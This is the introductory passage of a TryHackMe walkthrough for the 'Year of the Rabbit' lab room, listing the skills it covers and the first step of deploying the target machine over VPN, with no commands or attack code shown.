TryHackMe Walkthrough - Year of the Rabbit
Author: Adhith
Introduction
In this walkthrough, we will solve the Year of the Rabbit challenge from TryHackMe.
This room focuses on:
Web enumeration
Hidden directories
Credential discovery
Privilege escalation

The goal is to gain access to the machine and retrieve the user and root flags.

---

1. Deploy the Machine
First, start the machine on TryHackMe and connect using VPN.
You will receive a target IP address.
Example:
10.10.xx.xx

---

